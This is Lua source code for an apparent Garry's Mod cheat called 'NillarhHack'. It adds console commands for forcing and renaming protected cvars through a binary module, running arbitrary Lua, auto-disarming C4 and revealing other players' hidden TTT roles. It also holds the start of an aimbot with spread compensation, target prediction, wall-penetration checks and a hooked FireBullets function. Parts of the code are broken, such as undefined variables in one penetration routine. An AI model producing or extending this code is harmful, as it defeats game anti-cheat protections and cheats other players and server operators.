NH.AddCmd( "bind_down_think", function( args, targs ) 

	local key = args[ 1 ];
	local command = args[ 2 ];

	local res = NH.Binds.AddBind( key, command, "down_think" );

	if ( !res ) then 

		return res, "Key '" .. key .. "' not found!";

	end

	return res;

end, NH.Commands[ "bind_down" ].onType );

/* ========================================================================================================================== */

NH.AddCmd( "bind_up_think", function( args, targs ) 

	local key = args[ 1 ];
	local command = args[ 2 ];

	local res = NH.Binds.AddBind( key, command, "up_think" );

	if ( !res ) then 

		return res, "Key '" .. key .. "' not found!";

	end

	return res;

end, NH.Commands[ "bind_down" ].onType );

/* ========================================================================================================================== */

// Bind down macro
NH.AddCmd( "bind", NH.Commands[ "bind_down" ].execute, NH.Commands[ "bind_down" ].onType );

/* ========================================================================================================================== */

NH.AddCmd( "rcc", function( args, targs )

	local command = "";

	for k,v in g.pairs( args ) do command = command .. v; end

	if ( command == "" ) then 

		return false, "Cannot run nothing!";

	end

	command = command:sub( 1, command:len() - 1 );

	Module.INillarhHack.RunConsoleCommand( command .. "t" );

	return true, "Ran Console Command "..args[1]; 

end);


/* ========================================================================================================================== */

/*local toggler = 0

	if args[1] == "1" then

		if toggler == 0 then
			toggler = 1
			--[[LocalPlayer():SetEyeAngles(Angle(0,LocalPlayer():GetAimVector():Angle().y+180,0))   --since the magneto stick loses control when we turn too fast, I can't use this :/]]
			g.hook.Add("CalcView", "NH_PCam", function(ply, ori, ang, fov, nz, fz)
				local view = {}

				view.origin = ori
				view.angles = g.Angle(0,ang.y+180, 0)
				view.fov = fov

				return view		
			end)
		else
			g.hook.Remove("CalcView", "NH_PCam")
			local preaim = me:GetAimVector():Angle()
			local newaim = me:GetAimVector():Angle()
			g.hook.Add("CreateMove", "NH_180", function(cmd)
				newaim = g.Angle(0,newaim.y+10,0)
				cmd:SetViewAngles(newaim)
				if newaim == g.Angle(0,preaim.y+120,0) then
					g.RunConsoleCommand("+attack2")
					g.timer.Simple(.1, function()
						g.RunConsoleCommand("-attack2")
					end)
				end
				if newaim == g.Angle(0,preaim.y+180,0) then
					g.hook.Remove("CreateMove", "NH_180")
				end
			end)
			toggler = 0
		end

	elseif args[1] == "2" then*/

function NH.Turn()
-- Turn function
me:SetEyeAngles(me:EyeAngles ()-g.Angle(0,10,0))
end

function NH.TurnBack()
-- Turn 180 function
me:SetEyeAngles(me:EyeAngles ()-g.Angle(0,180,0))
end

NH.AddCmd( "ttt_throwmagneto", function( args, targs )

	-- Nice and easy, turn it slow 180 
	g.timer.Simple(.02,NH.Turn);
	g.timer.Simple(.04,NH.Turn);
	g.timer.Simple(.06,NH.Turn);
	g.timer.Simple(.08,NH.Turn);
	g.timer.Simple(.10,NH.Turn);
	g.timer.Simple(.12,NH.Turn);
	g.timer.Simple(.14,NH.Turn);
	g.timer.Simple(.16,NH.Turn);
	g.timer.Simple(.18,NH.Turn);
	g.timer.Simple(.20,NH.Turn);
	g.timer.Simple(.22,NH.Turn);
	g.timer.Simple(.24,NH.Turn);
	g.timer.Simple(.26,NH.Turn);
	g.timer.Simple(.28,NH.Turn);
	g.timer.Simple(.30,NH.Turn);
	g.timer.Simple(.32,NH.Turn);
	g.timer.Simple(.34,NH.Turn);
	g.timer.Simple(.36,NH.Turn);
	-- OH MY GOD WHIP AROUND 180
	g.timer.Simple(.46,NH.TurnBack);
	-- And deliver the final blow by pressing right click
	g.timer.Simple(.7,function() g.RunConsoleCommand("+attack"); end);
	g.timer.Simple(.72,function() g.RunConsoleCommand("-attack"); end);
	
	return true
end )

/* ========================================================================================================================== */

NH.AddCmd( "toggle_console", function( args, targs )

	NH.GUI.ConsoleToggle();
	return true; 

end);

/* ========================================================================================================================== */

NH.AddCmd( "force_cvar", function( args, targs )

	if ( !args[ 1 ] ) then 

		return false, "No ConVar specified!";

	end 

	if ( !args[ 2 ] ) then 

		return false, "No value specified!";

	end

	local name = args[ 1 ];
	local value = args[ 2 ];

	value = g.tonumber( value ) or g.tostring( value );

	if ( targs[ "-unsafe" ] ) then 

		Module.INillarhHack.SetCVar( name, value );

	else 

		NH.ForceCVarSafe( name, value );

	end

	return true, "Forced cvar "..args[1].." to "..args[2]; 

end);

/* ========================================================================================================================== */

NH.AddCmd( "run_lua", function( args, targs )

	local command = "";

	for _, com in g.pairs( args ) do 

		command = command .. com .. " ";

	end

	if ( command == "" ) then 

		return false, "Cannot run nothing!";

	end

	Module.INillarhHack.RunString( g.tostring( command ) );

	return true; 

end);

/* ========================================================================================================================== */

NH.AddCmd( "ttt_disarm_c4", function( args, targs )

	if !me:IsTraitor() then

		for k, v in g.pairs( g.ents.FindByClass( "ttt_c4" ) ) do

			if g.IsValid(v) and v:GetPos():Distance( me:GetPos() ) < 1000 and v:GetOwner() != me and v:GetArmed() then

				for i = 1,6 do

					g.RunConsoleCommand( "ttt_c4_disarm", g.tostring(v:EntIndex()), g.tostring(i) )

				end

			else

				return false, "No C4 found.";

			end

		end

	else

		return false, "No C4 found.";

	end

	return true; 

end);

/* ========================================================================================================================== */

NH.AddCmd( "ttt_drop", function( args, targs )

	for _, ply in g.pairs( g.player.GetAll() ) do 

		NH.Logging.Print( NH.Get( "Logging", "log_console" ), "[" .. ply:GetName() .. "] Inno : " .. g.tostring( NH.IsInnocent( ply ) ) .. " | Trait : " .. g.tostring( NH.IsTraitor( ply ) ) );

	end

	return true; 

end);

/* ========================================================================================================================== */

NH.AddCmd( "ttt_clear", function( args, targs )

	// Resetting all tables
	g.timer.Simple( 2, function()
		for k, v in g.pairs( NH.Traitor.Players ) do
			g.table.remove( NH.Traitor.Players, k )
			NH.Traitor.Players = {}
		end
		for k, v in g.pairs( NH.Traitor.Weps ) do
			g.table.remove( NH.Traitor.Weps, k )
			NH.Traitor.Weps = {}
		end 
		for k, v in g.pairs( NH.DeathCheck.DeadPlayers ) do
			g.table.remove( NH.DeathCheck.DeadPlayers, k )
			NH.DeathCheck.DeadPlayers = {}
		end 
	end ) 

	NH.Logging.Print( NH.Get( "Logging", "log_console" ), "Cleared!" );

	return true; 

end);

/* ========================================================================================================================== */

NH.AddCmd( "save_config", function( args, targs )

	local conf = args[ 1 ] or "";

	g.string.Replace( conf, "/", "" );
	g.string.Replace( conf, "\\", "" );
	g.string.Replace( conf, "", "" );
	g.string.Replace( conf, ":", "" );

	conf = conf:lower();

	if ( conf == "default" ) then return false, "Cannot save as 'default'!"; end

	if ( conf == "" ) then 

		return false, "No config name specified!";

	else 

		g.file.Write( "NillarhHack/configs/" .. conf .. ".txt", g.util.TableToKeyValues( NH.KeySafe( NH.ConfigurationStructure ) ), "DATA");

		NH.Logging.Print( NH.Get( "Logging", "log_console" ), conf .. ".txt saved!" );
		NH.Logging.Print( NH.Get( "Logging", "log_console" ), "Changes will be saved into this config, to load the default config again do 'load_config default'");

		NH.CurrentConfig = conf;

	end

	return true; 

end);

/* ========================================================================================================================== */

// TODO: Add a function to get all the configs and use them in the auto-complete!
NH.AddCmd( "load_config", function( args, targs )

	local conf = args[ 1 ] or "";

	g.string.Replace( conf, "/", "" );
	g.string.Replace( conf, "\\", "" );
	g.string.Replace( conf, "", "" );
	g.string.Replace( conf, ":", "" );

	conf = conf:lower();

	if ( conf == "" ) then 

		return false, "No config name specified!";

	else 

		if ( g.file.Exists("NillarhHack/configs/" .. conf .. ".txt", "DATA") ) then 

			local res = NH.SafeLoadConfig( conf );

			if ( !res ) then return false, "Failed load, config corrupt!"; end

			NH.Logging.Print( NH.Get( "Logging", "log_console" ), conf .. ".txt loaded!" );
			NH.Logging.Print( NH.Get( "Logging", "log_console" ), "Changes will be saved into this config, to load the default config again do 'load_config default'");

			NH.CurrentConfig = conf;

		else 

			return false, "Config '" .. conf .. ".txt' doesn't exist!";

		end

	end

	return true; 

end, 
function( name, args, inp )

	local ret, coms = "", {};

	if ( !args[ 1 ] || #args != 1 ) then return ret, coms; end

	for name, _ in g.pairs( g.file.Find( "NillarhHack/configs/*", "DATA" ) ) do 

		if ( g.string.Right( name, 5 ) != ".txt" ) then continue; end

		if ( args[ 1 ]:lower() == name:sub( 1, args[ 1 ]:len() ):lower() && args[ 1 ]:lower() != name:lower() ) then 

			if ( ret == "" ) then ret = inp:sub( 1, inp:len() - args[ 1 ]:len() ) .. name; end
			coms[ #coms + 1 ] = { text = ( inp .. name ), display = name };

		end

	end

	return ret, coms;

end );

/* ========================================================================================================================== */

NH.AddCmd( "clear_config", function( args, targs )

	NH.ConfigurationStructure = NH.DefaultConfigurationStructure;

	g.file.Write( "NillarhHack/configs/" .. NH.CurrentConfig .. ".txt", g.util.TableToKeyValues( NH.ConfigurationStructure ), "DATA");

	NH.Logging.Print( NH.Get( "Logging", "log_console" ), NH.CurrentConfig .. ".txt cleared!" );

	// Reset the console bind, that's needed 
	NH.Get( "Binds", "key_down" )[ 71 ] = { "insert", KEY_F10, "toggle_console" };

	return true; 

end);

/* ========================================================================================================================== */

NH.AddCmd( "force_cvar_name", function( args, targs )

	if ( !args[ 1 ] ) then 

		return false, "No ConVar specified!";

	end 

	if ( !args[ 2 ] ) then 

		return false, "No name specified!";

	end

	local name = args[ 1 ];
	local value = args[ 2 ];

	value = g.tonumber( value ) or g.tostring( value );

	Module.INillarhHack.SetCVarName( name, value );
	g.table.insert( NH.BadPrints, name );
--	local Definition = GetConVar( name );
--	CreateClientConVar(name, Definition:GetDefault(), 0, 0);

	return true; 

end);

/* ========================================================================================================================== */

NH.AddCmd( "add_friend", function( args, targs )

	if ( !args[ 1 ] ) then 

		return false, "No User specified!";

	end 

	local name = args[ 1 ];

	for _, ply in g.pairs( g.player.GetAll() ) do 
//	player.GetObject( name )
		if ( ply == me ) then continue; end

		if ( g.string.lower(( g.tostring( r["Player"]["Name"]( ply ) ) )) == g.string.lower( g.tostring( name ) ) ) then 

			name = r["Player"]["SteamID"]( ply );
			if ( NH.IsBot( ply ) ) then name = ply; end

		else

			

		end

	end

	NH.ConfigurationStructure["Aimbot"]["friends"][ name ] = true;
	return true; 

end, 
function( name, args, inp )

	local ret, coms = "", {};

	if ( !args[ 1 ] || #args != 1 ) then return ret, coms; end
	for _, ply in g.pairs( g.player.GetAll() ) do 

		if ( ply == me ) then continue; end

		local name = r["Player"]["Nick"]( ply );

		if ( g.string.lower(args[ 1 ]) == g.string.lower(name:sub( 1, args[ 1 ]:len() )) && g.string.lower(args[ 1 ]) != g.string.lower(name) ) then 

			if ( ret == "" ) then ret = inp:sub( 1, inp:len() - args[ 1 ]:len() ) .. name; end
			coms[ #coms + 1 ] = { text = ( inp .. name ), display = name };

		end

	end

	return ret, coms;

end);

/* ========================================================================================================================== */

NH.AddCmd( "remove_friend", function( args, targs )

	if ( !args[ 1 ] ) then 

		return false, "No User specified!";

	end 

	local name = args[ 1 ];

	for _, ply in g.pairs( g.player.GetAll() ) do 

		if ( ply == me ) then continue; end

		if ( g.string.lower(( g.tostring( r["Player"]["Nick"]( ply ) ) or "" )) == g.string.lower( g.tostring( name or "" ) ) ) then 

			name = r["Player"]["SteamID"]( ply );
			if ( NH.IsBot( ply ) ) then name = ply; end

		end

	end

	NH.ConfigurationStructure["Aimbot"]["friends"][ name ] = false;
	return true; 

end, 
function( name, args, inp )

	local ret, coms = "", {};

	if ( !args[ 1 ] || #args != 1 ) then return ret, coms; end
	for name, val in g.pairs( NH.Get( "Aimbot", "friends" ) ) do 

		if ( !val ) then continue; end

		for _, ply in g.pairs( g.player.GetAll() ) do 

			if ( r["Player"]["SteamID"]( ply ) == name ) then 

				name = r["Player"]["Nick"]( ply );

			end

		end

		if ( args[ 1 ]:lower() == name:sub( 1, args[ 1 ]:len() ):lower() && args[ 1 ]:lower() != name:lower() ) then 

			if ( ret == "" ) then ret = inp:sub( 1, inp:len() - args[ 1 ]:len() ) .. name; end
			coms[ #coms + 1 ] = { text = ( inp .. name ), display = name };

		end

	end

	return ret, coms;

end );

/* ========================================================================================================================== */

NH.AddCmd( "toggle", function( args, targs )

	local text = ""

	args[ 1 ] = NH.MatchConfigCase( args[ 1 ] or "" );

	if ( NH.ConfigurationStructure[ args[ 1 ] ] == nil ) then 

		return false, g.tostring( args[ 1 ] ) .. " doesn't exist!";

	end 

	if ( args[ 2 ] && NH.ConfigurationStructure[ args[ 1 ] ][ args[ 2 ] ] == nil ) then 

		return false, g.tostring( args[ 1 ] ) .. "" .. g.tostring( args[ 2 ] ) .. " doesn't exist!";

	end 

	local value = NH.Get( args[ 1 ], args[ 2 ] );

	if ( g.isbool( value ) ) then

		NH.Set( args[ 1 ], args[ 2 ], !value );

	else 

		return false, "Cannot toggle non bool values!";

	end 

	return true; 

end, NH.Commands[ "set" ].onType );

/* ========================================================================================================================== */

NH.AddCmd( "new_script", function( args, targs )

	local frame = NH.VGUI.CreateElement( "DFrame" );

	frame:Center();
	frame:ShowCloseButton( true )
	frame:SetVisible( true );
	frame:ShowCloseButton( true );
	frame:SetTitle( args[ 1 ] or "Untitled" );
	frame:SetDraggable( true );
	frame:MakePopup();
	frame:SetSize( 500, 500 );

	local lua = NH.VGUI.CreateElement( "DPanel", frame );

	lua:SetPos( 10, 40 );
	lua:SetSize( frame:GetWide() - 20, frame:GetTall() - 60 );

	local text = NH.VGUI.CreateElement( "DTextEntry", lua );

	text:SetPos( 0, 0 );
	text:SetSize( lua:GetSize() );
	text:SetEditable( true );
	text:SetFont( "DefaultFixed" );
	text:SetWide( lua:GetWide() - 20, lua:GetTall() - 30 );

	text.OnEnter = function()
		g.RunString( g.tostring( text:GetText() ) )
		text:UpdateConvarValue()
		text:OnValueChange( text:GetText() )
	end

	return true;

end);

/* ========================================================================================================================== */

NH.AddCmd( "run_script", function( args, targs )

	if ( !args[ 1 ] || g.file.Exists( "NillarhHack/scripts/" .. args[ 1 ], "DATA" ) ) then 

		return false, "Script not found!";

	else 

		local func = g.RunString( g.file.Read( "NillarhHack/scripts/" .. args[ 1 ], "DATA" ) );

		if ( !g.isfunction( func ) ) then 

			return false, "Compile error - " .. g.tostring( func );

		end

		local err, ret = g.pcall( func, {} ); // Replace {} with special script stuff.

		if (!err) then 

			return false, "Script failed - " .. ret;

		else

			NH.Logging.Print( NH.Get( "Logging", "log_console" ), "Script run, return value = " .. g.tostring( ret ) );

		end

	end

end, 
function( name, args, inp )

	local ret, coms = "", {};

	if ( !args[ 1 ] || #args != 1 ) then return ret, coms; end

	for name, _ in g.pairs( g.file.Find( "NillarhHack/scripts/" .. args[ 1 ], "DATA" ) ) do 

		if ( g.string.Right( name, 4 ) != ".lua" ) then continue; end

		if ( args[ 1 ]:lower() == name:sub( 1, args[ 1 ]:len() ):lower() && args[ 1 ]:lower() != name:lower() ) then 

			if ( ret == "" ) then ret = inp:sub( 1, inp:len() - args[ 1 ]:len() ) .. name; end
			coms[ #coms + 1 ] = { text = ( inp .. name ), display = name };

		end

	end

	return ret, coms;

end);

/* ========================================================================================================================== */

NH.AddCmd( "force_cvar_toggle", function( args, targs )

	local name = args[ 1 ] or "";

	if ( g.GetConVar( name ) ) then 

		local value = g.GetConVarNumber( name ) == 0 and 1 or 0;

		Module.INillarhHack.SetCVar( name, value );

	else 

		return false, "No such CVar!";

	end

	return true;

end );

/* ========================================================================================================================== */

NH.AddCmd( "version", function( args, targs )

	NH.Logging.Print( NH.Get( "Logging", "log_console" ), "Lua Script    : v" .. NH.Version );
	NH.Logging.Print( NH.Get( "Logging", "log_console" ), "Binary Module : v" .. Module.INillarhHack.GetVersion() );

	return true;

end );

/* ========================================================================================================================== */

NH.AddCmd( "disconnect", function( args, targs )

	local reason = "[NH]";

	for _, str in g.pairs( args ) do reason = reason .. " " .. str; end

	Module.INillarhHack.Disconnect( reason );

	return true;

end );

/* ========================================================================================================================== */

NH.AddCmd( "clear_console", function( args, targs )

	NH.GUI.Console.RichText:SetText( "" );

	return true;

end );

/* ========================================================================================================================== */

NH.AddCmd( "spectate", function( args, targs )

	if ( !args[ 1 ] ) then 

		NH.Set( "CNoClip", "enabled", false );
		NH.Set( "CNoClip", "spectate_players", false );
		NH.Set( "CNoClip", "player_sid", "" );

		NH.Logging.Print( NH.Get( "Logging", "log_console" ), "You're no longer spectating anyone" );

		return true;

	else 

		for _, ply in g.pairs( g.player.GetAll() ) do 

			if ( r["Player"]["Nick"]( ply ):lower() == args[ 1 ]:lower() ) then 

				NH.Set( "CNoClip", "enabled", true );
				NH.Set( "CNoClip", "spectate_players", true );
				NH.Set( "CNoClip", "player_sid", !NH.IsBot( ply ) and r["Player"]["SteamID"]( ply ) or args[ 1 ] );

				NH.Logging.Print( NH.Get( "Logging", "log_console" ), "You're now spectating " .. args[ 1 ] );

				return true;

			end

		end

		return false, "Player not found!";

	end

end, NH.Commands[ "add_friend" ].onType ); // Use onType function from add_friend

/*
	#     #                                  ##  #####                                #######                                                 ##   
	#     #  ####   ####  #    #  ####      #   #     # #    # ######   ##   #####    #       ######   ##   ##### #    # #####  ######  ####    #  
	#     # #    # #    # #   #  #         #    #       #    # #       #  #    #      #       #       #  #    #   #    # #    # #      #         # 
	####### #    # #    # ####    ####     #    #       ###### #####  #    #   #      #####   #####  #    #   #   #    # #    # #####   ####     # 
	#     # #    # #    # #  #        #    #    #       #    # #      ######   #      #       #      ######   #   #    # #####  #           #    # 
	#     # #    # #    # #   #  #    #     #   #     # #    # #      #    #   #      #       #      #    #   #   #    # #   #  #      #    #   #  
	#     #  ####   ####  #    #  ####       ##  #####  #    # ###### #    #   #      #       ###### #    #   #    ####  #    # ######  ####  ##   
*/

// ============================= Aimbot ============================= //

NH.Aimbot = {};
NH.Aimbot.BestTarget = nil;
NH.Aimbot.Conecur = {}
NH.Aimbot.Conevec = Vector( 0, 0, 0 );
NH.Aimbot.Coneval = Vector( 0, 0, 0 );
NH.Aimbot.ConeCache = {
	
	[ "weapon_zs_base" ]	= function( wep )
								Cone = wep.Cone or wep.Primary.Cone or 0		
								if me:GetVelocity():Length() > 20 then
									return wep.ConeMoving
								end									
								if me:Crouching() then
									return wep.ConeCrouching
								end		
								return Cone
							end,
	["weapon_sh_base"]		= function( wep )
								if ( !wep:GetIronsights() ) then 
									local type2 = ( wep.Sniper and 8 or wep.SMG and 2 or wep.Pistol and 2 or wep.Primary.Ammo == "buckshot" and 0 or 1.6 );
									local sg = wep.Primary.Ammo == "buckshot" and wep.Primary.Cone or 0	
									local stance = me:IsOnGround() and me:Crouching() and 10 -- Crouching
								or !wep.Sprinting and me:IsOnGround() and 15 --Standing
								or wep.Walking and me:IsOnGround() and 20 --Walking
								or !me:IsOnGround() and 25  --Flying
								or wep.Primary.Ammo == "buckshot" and 0 --Shotguns not affected
									local cone = wep.Primary.Cone * wep.Primary.Recoil * stance * type2 + sg;
									return -cone
								else 
									return -wep.Primary.Cone
								end
							end,
	[ "weapon_sh_base_pistol" ]	= function( wep ) 
									return NH.Aimbot.ConeCache["weapon_sh_base"]( wep ) 
								end,
	[ "weapon_zs_base" ]	= function( wep )
								local flCone = wep.Cone or wep.Primary.Cone or 0
								if me:GetVelocity():Length() > 20 then
									return wep.ConeMoving
								end
								if me:Crouching() then
									return wep.ConeCrouching
								end
								return flCone
							end,
	[ "weapon_fl_base" ]	= function( wep )
								local flLastShot = wep.Weapon:GetNetworkedFloat( "LastShootTime", 0 )
								local flLastShotMod = g.math.Clamp( wep.LastFireMax + 1 - g.math.Clamp( ( g.CurTime() - flLastShot ) * wep.LastFireModifier, 0.0, wep.LastFireMax ), 1.0, wep.LastFireMaxMod )
								local flCone = wep.Primary.Accuracy
								if me:IsMoving() then 
									flCone = flCone * wep.MoveModifier 
								end
								if wep.Weapon:GetNetworkedBool( "Ironsights", false ) then 
									flCone = flCone * 0.75 
								end
								flCone = flCone * ( ( 16 - wep.Owner:GetSkillLevel( "aim" ) ) / 11 )
								if me:KeyDown( IN_DUCK ) then
									return flCone * wep.CrouchModifier * flLastShotMod
								else
									return flCone * flLastShotMod
								end
							end,

};
NH.Aimbot.ConeDefaultCache = 
{
	["#HL2_SMG1"] 			= WeaponVector( 0.04362, true ),
	["#HL2_Pistol"] 		= WeaponVector( 0.0100, true ),
	["#HL2_Pulse_Rifle"] 	= WeaponVector( 0.02618, true ),
	["#HL2_Shotgun"] 		= WeaponVector( 0.08716, true ),
};
NH.Aimbot.Prediction = {
["weapon_crossbow"] = 3485,
["weapon_pistol"] = 40000,
["weapon_357"] = 20500,
["weapon_smg"] = 39000,
["weapon_ar2"] = 39000,
["weapon_shotgun"] = 35000,
["weapon_rpg"] = 0,    
};
NH.Aimbot.LastFrameTime = g.FrameTime();
NH.Aimbot.ModelTarget = {
["models/crow.mdl"] = g.Vector(0, 0, 5), 
["models/pigeon.mdl"] = g.Vector(0, 0, 5),
["models/seagull.mdl"] = g.Vector(0, 0, 6), 
["models/combine_scanner.mdl"] = "Scanner.Body",
["models/hunter.mdl"] = "MiniStrider.body_joint", 
["models/combine_turrets/floor_turret.mdl"] = "Barrel",
["models/dog.mdl"] = "Dog_Model.Eye", 
["models/vortigaunt.mdl"] = "ValveBiped.Head",
["models/antlion.mdl"] = "Antlion.Body_Bone", 
["models/antlion_guard.mdl"] = "Antlion_Guard.Body",
["models/antlion_worker.mdl"] = "Antlion.Head_Bone", 
["models/zombie/fast_torso.mdl"] = "ValveBiped.HC_BodyCube",
["models/zombie/fast.mdl"] = "ValveBiped.HC_BodyCube", 
["models/headcrabclassic.mdl"] = "HeadcrabClassic.SpineControl",
["models/headcrabblack.mdl"] = "HCBlack.body", 
["models/headcrab.mdl"] = "HCFast.body",
["models/zombie/poison.mdl"] = "ValveBiped.Headcrab_Cube1", 
["models/zombie/classic.mdl"] = "ValveBiped.HC_Body_Bone",
["models/zombie/classic_torso.mdl"] = "ValveBiped.HC_Body_Bone", 
["models/zombie/zombie_soldier.mdl"] = "ValveBiped.HC_Body_Bone",
["models/combine_strider.mdl"] = "Combine_Strider.Body_Bone", 
["models/combine_dropship.mdl"] = "D_ship.Spine1",
["models/combine_helicopter.mdl"] = "Chopper.Body", 
["models/gunship.mdl"] = "Gunship.Body",
["models/lamarr.mdl"] = "HeadcrabClassic.SpineControl", 
["models/mortarsynth.mdl"] = "Root Bone",
["models/synth.mdl"] = "Bip02 Spine1", 
["models/vortigaunt_slave.mdl"] = "ValveBiped.Head",
["models/manhack.mdl"] = "Manhack.MH_Control",
};
NH.Aimbot.PosAttachments = {
"eyes", "forward", "head",
};
NH.Aimbot.OldTime = ( 0.0067 );
NH.Aimbot.PredictedTime = ( NH.Aimbot.OldTime - g.CurTime() );
NH.Aimbot.OldVelocity = {};
NH.Aimbot.PredictedVelocity = {};
NH.Aimbot.Prediction = {
["weapon_crossbow"] = 3110,
["weapon_pistol"] = 40000,
["weapon_357"] = 20500,
["weapon_smg"] = 39000,
["weapon_ar2"] = 39000,
["weapon_shotgun"] = 35000,
["weapon_rpg"] = 0,
["soldier_rocketlauncher"] = 1050,
["soldier_blackbox"] = 1050,
["soldier_directhit"] = 1960
}

NH.Detours.Add( _G.debug.getregistry()["Entity"], "FireBullets", function( ent, bullet )

	NH.Aimbot.Conecur[me:GetActiveWeapon():GetPrintName()] = bullet['Spread'];

	return NH.Detours.GetOriginal( _G.debug.getregistry()["Entity"], "FireBullets" )( ent, bullet )

end, NH.Detours.Modes.DETOUR_NORMAL );

/* --------------------------------------------------------------------- */

NH.Aimbot.Base = {}
function NH.Aimbot.Base.MADCOW( w, trc )
	local shell = {
		{ a = "AirboatGun", n = 18 },
		{ a = "Gravity", n = 8 },
		{ a = "AlyxGun", n = 12 },
		{ a = "Battery", n = 14 },
		{ a = "StriderMinigun", n = 20 },
		{ a = "SniperPenetratedRound", n = 16 },
		{ a = "CombineCannon", n = 20 },
	}
	
	local max = 16
	for k, v in g.pairs( shell ) do
		if( w.Primary["Ammo"] == v.a ) then
			max = v.n
		end
	end

	function CreateTrace( tr )
		if( ( tr.MatType == MAT_METAL && w.Ricochet ) or ( tr.MatType == MAT_SAND ) or ( tr.Entity:IsPlayer() ) ) then return false end
		local dir = tr.Normal * max
		
		if( tr.MatType == MAT_GLASS or tr.MatType == MAT_PLASTIC or tr.MatType == MAT_WOOD or tr.MatType == MAT_FLESH or tr.MatType == MAT_ALIENFLESH ) then
			dir = tr.Normal * ( max * 2 )
		end
		
		local trace = {
			endpos = tr.HitPos,
			start = tr.HitPos + dir,
			mask = MASK_SHOT,
			filter = { me },
		}
		local t = g.util.TraceLine( trace )
		
		if( t.StartSolid or t.Fraction >= 1.0 or tr.Fraction <= 0.0) then return false end
		return true
	end
	return CreateTrace( trc )
end

function NH.Aimbot.Base.GTA( w, tr )
	local dir = tr.Normal * ( w.GetPenetrationDistance && w:GetPenetrationDistance( tr.MatType ) or 0 )
	
	local trace = {
		endpos = tr.HitPos,
		start = tr.HitPos + dir,
		mask = MASK_SHOT,
		filter = { me },
	}
	local t = g.util.TraceLine( trace ) 
	
	if( t.StartSolid or t.Fraction >= 1.0 or tr.Fraction <= 0.0 ) then return false end
	return true
end

function NH.Aimbot.Base.SNIPERWARS( w, tr )
	if ( w:GetClass() != "sniper_railgun" ) then return false end
	if( t.HitSky ) then return false end
	
	local pdir = t.Normal * self.PenetrationDist
	
	local trace = {
		start = t.HitPos + t.Normal,
		endpos = trace.start + pdir,
		mask = MASK_SOLID + CONTENTS_HITBOX,
	}
	
	if( g.util.PointContents( trace.endpos ) != 0 ) then return false end
	local t = g.util.TraceLine( trace ) 
	
	if( !t.StartSolid ) then return false end
	if( t.FractionLeftSolid == 1 || t.FractionLeftSolid == 0 ) then return false end
	
	return true
end

NH.Aimbot.Base.bases = {
	{ base = "MADCOW", items = { "weapon_mad_base", "weapon_mad_base_sniper" }, bounce = 3 },
	{ base = "GTA", items = { "gta_base", "as_swep_base" }, bounce = 3 },
	{ base = "SNIPERWARS", items = { "sniper_base" }, bounce = 3 },
}

function NH.Aimbot.GetBase(AUTOWALL)
	local w = me:GetActiveWeapon()
	if ( !me or !w ) then return false end
	local args = {AUTOWALL}
	
	for k, v in g.pairs( args ) do
		if ( w.Base && w.Base == v ) then
			return true
		end
	end
	return false
end

function NH.Aimbot.IsPenetrable( tr )
	if( !tr ) then return false end
	local w = me:GetActiveWeapon()

	local u = nil
	for k, v in g.pairs( NH.Aimbot.Base.bases ) do
		for _, i in g.pairs( v.items ) do
			if( NH.Aimbot.GetBase( i ) ) then
				u = v.base or nil
			end
		end
	end

	if( !u ) then return false end
	if( NH.Aimbot.Base.bases[u] ) then
		return NH.Aimbot.Base.bases[u]( w, tr )
	end
	return false
end

// fix because of outdated module.
function Module.INillarhHack.IsVisible( dir, pos, ent )

	local trace = g.util.TraceLine( {
		start = dir,
		endpos = pos,
		filter = { me, ent },
		mask = MASK_SHOT + CONTENTS_WINDOW
	} );

	if ( trace.Fraction >= NH.Get( "Aimbot", "trace_fraction") ) or ( NH.Get( "Aimbot", "trace_autowall") and NH.Aimbot.IsPenetrable( trace ) ) then return true end

	return false

end

/* --------------------------------------------------------------------- */

function NH.Aimbot.CanTarget( ent )

	if ( !ent || !g.IsValid( ent ) /*|| Module.INillarhHack.IsDormant( r["Entity"]["EntIndex"]( ent ) )*/ ) then return false; end

	local IsAdmin, AdminKind = NH.AdminReturn( ent )

	if ( NH.IsPlayer( ent ) ) then
	
		if ( !r["Player"]["Alive"]( ent ) ) then return false; end
		if ( r["Player"]["Team"]( ent ) == TEAM_SPECTATOR ) then return false; end
		if ( r["Player"]["GetFriendStatus"]( ent ) == "friend" && !NH.Get( "Aimbot", "target_steam_friends" ) ) then return false; end
		if ( g.IsValid( r["Player"]["GetVehicle"]( ent ) ) && !NH.Get( "Aimbot", "target_vehicles" ) ) then return false; end 
		if ( IsAdmin == true && !NH.Get( "Aimbot", "target_admins" ) ) then return false; end 
		if ( r["Player"]["Team"]( ent ) == r["Player"]["Team"]( me ) && !NH.Get( "Aimbot", "target_ownteam" ) ) then return false; end

	end

	if ( NH.IsBot( ent ) ) then

		if ( !NH.Get( "Aimbot", "target_bots" ) ) then return false; end

	end

	if ( NH.IsFriend( ent ) ) then return false; end 

	if ( NH.IsTraitor( me ) && NH.IsTraitor( ent ) && !NH.Get( "Aimbot", "target_traitors_as_traitor" ) ) then return false; end
	if ( ( NH.IsInnocent( me ) or NH.IsDetective( me ) ) && NH.IsDetective( ent ) && !NH.Get( "Aimbot", "target_detectives_as_innocent" ) ) then return false; end
	if ( ( NH.IsInnocent( me ) or NH.IsDetective( me ) ) && NH.IsInnocent( ent ) && !NH.Get( "Aimbot", "target_innocents_as_innocent" ) ) then return false; end

	if ( IsStronghold == true or IsDRP == true ) then
		if ( ent:GetColor()['a'] < 255 ) then return false; end
	end

	//if ( _G.KARMA && !NH.TTTCanShoot( ent ) ) then return false; end

	local fov = g.tonumber( NH.Get( "Aimbot", "trace_maxfov" ) );
	if ( fov ~= 180 ) then
		local lpang = me:GetAngles();
		local ang = (ent:GetPos() - me:GetPos()):Angle();
		local ady = g.math.abs(g.math.NormalizeAngle(lpang.y - ang.y))
		local adp = g.math.abs(g.math.NormalizeAngle(lpang.p - ang.p ))
		if(ady > fov or adp > fov) then return false; end
	end

	return true;

end

function NH.Aimbot.CanFire()

	local wep = r["Player"]["GetActiveWeapon"]( me );

	if ( !me || !wep || !g.IsValid( wep ) ) then return false; end 
	if ( !r["Player"]["Alive"]( me ) ) then return false; end

	if ( NH.Get( "Aimbot", "check_ammo" ) && r["Weapon"]["Clip1"]( wep ) <= 0 ) then return false; end
	if ( NH.Get( "Aimbot", "bad_weapons" )[ wep ] ) then return false; end
	if ( wep.reloading || wep.Reloading || wep.isReloading ) then return false; end

	return true;

end

function NH.Aimbot.IsBetter( ent, old )

	local dist = r["Vector"]["DistToSqr"]( r["Entity"]["GetPos"]( ent ), r["Entity"]["GetPos"]( me ) );
